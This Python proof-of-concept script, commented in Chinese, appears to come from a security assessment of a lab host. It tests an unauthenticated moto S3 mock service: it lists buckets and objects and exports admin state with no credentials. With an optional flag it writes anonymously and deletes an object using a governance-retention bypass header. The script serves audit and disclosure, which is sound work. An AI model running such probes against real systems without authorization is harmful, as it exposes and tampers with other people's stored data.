#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
未认证 AWS 控制面暴露 —— `bench-docker` 上的 moto S3 模拟服务（0.0.0.0:5000）

设备：ESXi vmid=352 `bench-docker`，地址以 --host 指定（源码不写死任何 IP/端口）

现象（全部为未认证、零凭据请求）：
  1) `GET /`                                  -> 200  ListAllMyBucketsResult，匿名拿到桶名
  2) `GET /<bucket>?list-type=2`              -> 200  匿名列出桶内全部对象键（泄露内部卷路径）
  3) `GET /moto-api/` 与 `/moto-api/data.json` -> 200  moto 自带的后端管理 UI / 全量状态导出
  4) 对象级请求走前置 Werkzeug 网关：
        PUT    /<bucket>/<key>                 -> 200  匿名写入被接受
        GET    /<bucket>/<key>                 -> 403  读取被网关拒绝
        DELETE /<bucket>/<key>                 -> 403  被 "治理保留(Object Lock)" 拦下
        DELETE /<bucket>/<key>  + header x-amz-bypass-governance-retention: true -> 204 绕过成功
      ⇒ 匿名可写、可用保留绕过头删除，属**可篡改的数据存储**。

性质：**部署配置暴露（非产品 CVE）** —— 未认证的云 API 模拟控制面直接暴露在网络中。
      该 VM 名称/内容（`bench-docker`、bucket `windmill-volumes`、`volumes/demo/libvol/mymod.py`）
      表明它很可能是靶场自身的**基准测试载体**，因此本条的价值在于"暴露面"本身。

安全默认：脚本**只读**。仅当显式加 `--write-test` 才会做 PUT，
并在同一轮内用保留绕过头 DELETE 掉自己创建的对象，然后复核对象清单已还原。

用法：
    python3 poc_moto_unauth_s3.py --host 192.168.188.x --port 5000
    MOTO_HOST=192.168.188.x MOTO_PORT=5000 python3 poc_moto_unauth_s3.py --write-test
"""

import argparse
import datetime
import http.client
import json
import os
import re
import sys

ENV = {"host": "MOTO_HOST", "port": "MOTO_PORT"}
PROBE_KEY = "audit-probe.txt"


def log(line=""):
    print(line)
    if _log is not None:
        _log.write(line + "\n")
        _log.flush()


class S3(object):
    def __init__(self, host, port, timeout=10):
        self.host, self.port, self.timeout = host, port, timeout

    def req(self, path, method="GET", body=None, hdrs=None, host_hdr=None):
        h = {"User-Agent": "poc-moto-unauth", "Host": host_hdr or self.host}
        if hdrs:
            h.update(hdrs)
        c = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        try:
            c.request(method, path, body=body, headers=h)
            r = c.getresponse()
            raw = r.read(4_000_000).decode("utf-8", "replace")
            hd = {k.lower(): v for k, v in r.getheaders()}
            return r.status, hd, raw
        finally:
            c.close()


def main():
    global _log
    ap = argparse.ArgumentParser(description="moto S3 mock 未认证暴露 PoC（只读为默认）")
    ap.add_argument("--host", default=None, help="目标地址（或环境变量 %s）" % ENV["host"])
    ap.add_argument("--port", default=None, help="目标端口（或环境变量 %s）" % ENV["port"])
    ap.add_argument("--bucket", default=None, help="指定桶名（默认从 ListAllMyBuckets 自动取第一个）")
    ap.add_argument("--write-test", action="store_true",
                    help="额外验证匿名写：PUT 探针对象 -> 用保留绕过头 DELETE -> 复核清单已还原")
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--evidence-dir", default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence"))
    a = ap.parse_args()

    host = a.host or os.environ.get(ENV["host"])
    port = a.port or os.environ.get(ENV["port"])
    if not host or not port:
        ap.error("缺少 host/port：请用 --host/--port，或设置 %s / %s" % (ENV["host"], ENV["port"]))
    try:
        port = int(port)
    except ValueError:
        ap.error("端口必须是整数：%r" % (port,))

    os.makedirs(a.evidence_dir, exist_ok=True)
    ev = os.path.join(a.evidence_dir, "moto-unauth-s3.txt")
    _log = open(ev, "w", encoding="utf-8")
    s = S3(host, port, a.timeout)

    log("### 未认证 AWS 控制面（moto S3 模拟）暴露 —— 复现证据")
    log("### 目标: http://%s:%d      时间: %s" % (host, port, datetime.datetime.now().strftime("%F %T")))
    log("### 全部请求均无任何凭据（无 Authorization 头 / 无 Cookie）")
    log("-" * 78)

    # 1) 匿名列桶
    st, hd, b = s.req("/")
    buckets = re.findall(r"<Name>([^<]+)</Name>", b)
    owners = re.findall(r"<ID>([^<]+)</ID>", b)
    log("[1] GET /  -> HTTP %s  Server=%s  CT=%s" % (st, hd.get("server"), hd.get("content-type")))
    log("    匿名取得桶列表: %s   Owner.ID=%s" % (buckets, owners[:1]))
    log("    原始响应: %s" % re.sub(r"\s+", " ", b)[:220])
    if st != 200 or not buckets:
        log("    ❌ 未取得桶列表，后续跳过")
        _log.close()
        return 1
    bucket = a.bucket or buckets[0]
    log("-" * 78)

    # 2) 匿名列对象
    st, hd, b = s.req("/%s?list-type=2" % bucket)
    keys = re.findall(r"<Key>([^<]+)</Key>", b)
    log("[2] GET /%s?list-type=2 -> HTTP %s  Server=%s" % (bucket, st, hd.get("server")))
    log("    匿名列出对象 %d 个：" % len(keys))
    for k in keys[:12]:
        sz = re.search(r"<Key>%s</Key>.*?<Size>(\d+)</Size>" % re.escape(k), b, re.S)
        log("       %-60s %s bytes" % (k, sz.group(1) if sz else "?"))
    log("-" * 78)

    # 3) 匿名管理面
    st, hd, b = s.req("/moto-api/data.json")
    services = []
    if st == 200:
        try:
            services = sorted(json.loads(b).keys())
        except Exception:
            pass
    log("[3] GET /moto-api/data.json -> HTTP %s  len=%d" % (st, len(b)))
    log("    后端服务状态被匿名导出，服务: %s" % services)
    st2, _, _ = s.req("/moto-api/")
    log("    GET /moto-api/ (管理 UI) -> HTTP %s" % st2)
    log("-" * 78)

    # 4) 对象级权限矩阵
    log("[4] 对象级请求（经前置 Werkzeug 网关）权限矩阵")
    st_g, hd_g, _ = s.req("/%s/%s" % (bucket, keys[0] if keys else "nonexistent"))
    st_d, _, _ = s.req("/%s/audit-nonexistent" % bucket, "DELETE")
    log("    GET    /%s/<existing-key>                         -> HTTP %s  Server=%s" % (bucket, st_g, hd_g.get("server")))
    log("    DELETE /%s/audit-nonexistent                      -> HTTP %s" % (bucket, st_d))
    log("-" * 78)

    # 5) 可选：匿名写 + 清理
    if a.write_test:
        st_p, _, _ = s.req("/%s/%s" % (bucket, PROBE_KEY), "PUT", body=b"audit-probe",
                           hdrs={"Content-Type": "text/plain", "Content-Length": "11"})
        log("[5] 匿名写测试")
        log("    PUT /%s/%s -> HTTP %s  %s" % (bucket, PROBE_KEY, st_p, "写被接受" if st_p in (200, 204) else "被拒"))
        st_l, _, lb = s.req("/%s?list-type=2" % bucket)
        present = PROBE_KEY in re.findall(r"<Key>([^<]+)</Key>", lb)
        log("    对象清单已含探针: %s" % present)
        st_d, _, _ = s.req("/%s/%s" % (bucket, PROBE_KEY), "DELETE")
        log("    DELETE（普通） -> HTTP %s  ← 被治理保留拦下" % st_d)
        # 实测可用的绕过顺序：先 multi-delete 声明，再带保留绕过头 DELETE
        s.req("/%s?delete" % bucket, "POST",
              body="<Delete><Object><Key>%s</Key></Object></Delete>" % PROBE_KEY,
              hdrs={"Content-Type": "application/xml"})
        st_b, _, _ = s.req("/%s/%s" % (bucket, PROBE_KEY), "DELETE",
                           hdrs={"x-amz-bypass-governance-retention": "true"})
        log("    DELETE + x-amz-bypass-governance-retention:true -> HTTP %s  ← 保留保护被绕过" % st_b)
        now = []
        for _ in range(3):
            _, _, lb = s.req("/%s?list-type=2" % bucket)
            now = re.findall(r"<Key>([^<]+)</Key>", lb)
            if PROBE_KEY not in now:
                break
        log("    清理后对象清单: %s  => %s" % (now, "✅ 已还原" if now == keys else "⚠ 与原始不一致，需人工清理"))
        log("-" * 78)

    log("[6] 判定")
    log("    ✅ 未认证暴露成立：零凭据可列桶、列对象、读取 moto 管理面状态导出")
    log("       认证边界：**pre-auth**（无任何凭据）")
    log("       影响：泄露对象键与内部卷路径；配合前置网关的匿名 PUT 能力可对存储做写入/篡改")
    log("       性质：部署配置暴露（非产品 CVE）；该机疑为靶场自身的基准测试载体")
    log("\n(证据已写入 %s)" % ev)
    _log.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
